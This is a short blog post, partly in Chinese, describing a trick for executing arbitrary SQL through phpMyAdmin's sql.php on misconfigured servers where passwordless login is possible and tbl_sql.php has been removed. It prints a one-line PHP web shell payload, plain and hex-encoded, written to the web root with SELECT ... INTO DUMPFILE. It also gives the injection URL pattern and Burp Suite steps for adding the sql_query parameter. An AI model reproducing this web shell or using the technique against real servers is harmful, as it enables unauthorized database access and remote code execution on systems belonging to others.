---
layout:     post
title:      phpmyadmin独家技能
date:       2016-04-12
summary:    发现phpmyadmin的一个技能,只在一定情况下有效
categories: web
thumbnail:  jekyll 
tags:
 - web
 - phpmyadmin
---
### 0x01 Base

#### 1>website has phpmyadmin

#### 2>phpmyadmin can be logined by anyone without password

#### 3>the <strong>tbl_sql.php</strong> has been deleted by website manager or someone else

### 0x02 About

#### The web server runs phpmyadmin,but with wrong setup,makes it possible for anyone to logined in phpmyadmin without password,and able to read the root password.  

#### There are two files:<strong> tbl_sql.php,sql.php</strong>. Generally,tbl_sql.php has execute sqlquery function like below picture at arrow 1,sql.php has view sql database function like below picture at arrow 2.
<img src="../../../../../pic/phpmyadmin/phpmyadmin160413.png"><br>

#### generally,when we want to execute sql query like

```sql
select '<? php @eval($_POST[cmd]);?>' into dumpfile '/var/www/1.php'
or
select 0x3c3f2070687020406576616c28245f504f53545b636d645d293b3f3e into dumpfile '/var/www/1.php'
```

#### we will find this does not work here coz tbl_sql.php was deleted.It works out like below 404 error when I try to execute above query:
<img src="../../../../../pic/phpmyadmin/phpmyadmin160413_2.png">

### 0x03 Exploit

#### > use <strong>sql.php</strong> to execute sqlquery  

#### > usage:

```
https://xx.xx.xx/phpmyadmin/sql.php?xxx=xxx...&sql_query=[sqli]
```

#### > [sqli] is sqlquery sentence been urlencoded.

#### > eg.sql_query=select%20@@version

*detail*:  

#### 1>use burpsuite listening browser's post|get request parameters when clicking any table name like below:
<img src='../../../../../pic/phpmyadmin/phpmyadmin160413_3.png'>

#### 2>add add get request parameter *sql_query=select%20@@version*
<img src='../../../../../pic/phpmyadmin/phpmyadmin160413_4.png'>

#### 3>find sqli has been execute
<img src='../../../../../pic/phpmyadmin/phpmyadmin160413_5.png'>

    
